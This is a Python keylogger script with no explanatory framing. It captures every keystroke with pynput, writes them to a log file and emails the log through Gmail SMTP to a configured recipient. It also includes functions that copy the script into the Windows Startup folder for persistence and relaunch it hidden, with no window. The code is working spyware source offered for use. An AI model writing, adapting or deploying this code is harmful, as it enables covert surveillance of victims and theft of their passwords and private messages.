import os
import time
import pyperclip
import pyautogui
import smtplib
import ssl
import shutil
import subprocess
from email.message import EmailMessage
from pynput.keyboard import Listener

# Configuration
log_file = "keylog.txt"
email_address = "sender@gmail.com"
email_password = "yourpassword"
target_email = "reciver@gmail.com"


def on_press(key):
    """Logs key presses instantly and ensures no missing characters"""
    try:
        key = key.char  # Get actual character
    except AttributeError:
        # Handle special keys
        if key == key.space:
            key = " "
        elif key == key.enter:
            key = "\n"
        elif key == key.backspace:
            with open(log_file, "r") as f:
                content = f.read()
            content = content[:-1]  # Remove last character

            with open(log_file, "w") as f:
                f.write(content)
            return  # Exit function after handling backspace
        else:
            key = f"[{key.name}]"

    # Write key to file immediately
    with open(log_file, "a") as f:
        f.write(key)
        f.flush()  # Force write to file instantly



def send_email():
    """Sends the keylog file via email"""
    msg = EmailMessage()
    msg["Subject"] = "Keylog Report"
    msg["From"] = email_address
    msg["To"] = target_email

    # Check if log file exists before reading
    if os.path.exists(log_file):
        with open(log_file, "r") as f:
            log_content = f.read()
        msg.set_content(log_content)  # Attach keylog data
    else:
        msg.set_content("No keylog data found. Log file is missing.")

    # Send the email
    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(email_address, email_password)
        server.send_message(msg)


send_email()


def add_to_startup():
    """Copies the script to Windows Startup folder for persistence"""
    startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft\\Windows\\Start Menu\\Programs\\Startup")
    shutil.copy(__file__, startup_folder)


def run_in_background():
    """Runs the script stealthily in the background"""
    if os.name == "nt":
        subprocess.Popen(["pythonw", __file__], creationflags=subprocess.CREATE_NO_WINDOW)
    else:
        subprocess.Popen(["nohup", "python3", __file__, "&"])


# Start keylogging
with Listener(on_press=on_press) as listener:
    listener.join()


# Uncomment to enable features
# add_to_startup()

# run_in_background()